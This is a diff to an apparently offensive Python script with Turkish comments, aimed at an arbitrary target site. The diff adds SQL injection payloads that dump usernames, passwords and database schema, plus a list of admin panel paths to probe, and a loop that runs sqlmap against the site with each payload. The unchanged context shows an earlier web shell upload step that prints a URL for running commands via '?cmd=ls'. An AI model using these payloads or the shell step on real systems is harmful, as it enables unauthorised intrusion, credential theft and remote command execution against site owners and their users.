@@ -119,6 +119,44 @@ if upload_test == "e":
     print(f"\n{shell_file}")
     print(f"\nDaha sonra şu URL ile komut çalıştırabilirsiniz: http://{site}/uploads/{shell_file}?cmd=ls")
 
+# SQL Injection Test Payloadları
+sql_payloads = [
+    "' OR '1'='1",
+    "' UNION SELECT null, version()--",
+    "' UNION SELECT username, password FROM users--",
+    "' AND SLEEP(5)--",
+    "' UNION SELECT @@version, NULL--",
+    "' OR 'a'='a",
+    "' AND 1=1--",
+    "' OR 1=1#",
+    "' OR 'a'='a' --",
+    "' OR 1=1 LIMIT 1 OFFSET 1--",
+    "' UNION SELECT NULL, table_name FROM information_schema.tables--",
+    "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
+    "' OR EXISTS(SELECT 1)--",
+    "' OR NOT EXISTS(SELECT 1)--",
+    "' OR LENGTH(user()) > 1--",
+    "' UNION SELECT database(), version()--"
+]
+
+# Admin Paneli Payloadları
+admin_panel_payloads = [
+    "/admin/",
+    "/administrator/",
+    "/login/",
+    "/admin.php",
+    "/admin/login.php",
+    "/admin/index.php",
+    "/cpanel/",
+    "/admin_area/",
+    "/backend/",
+    "/adminpanel/"
+]
+# 1. SQL Injection Testi
+print("\nSQL Injection testleri başlıyor...\n")
+for payload in sql_payloads:
+    print(f"\nDenenen Payload: {payload}")
+    run_command(f"sqlmap -u http://{site} --data=\"param={payload}\" --batch", f"SQL Injection Test Sonucu ({payload})")
 # Rastgele Port Bilgisi
 if random_port:
     print(f"\n### Seçilen Rastgele Port: {random_port} ###\n")
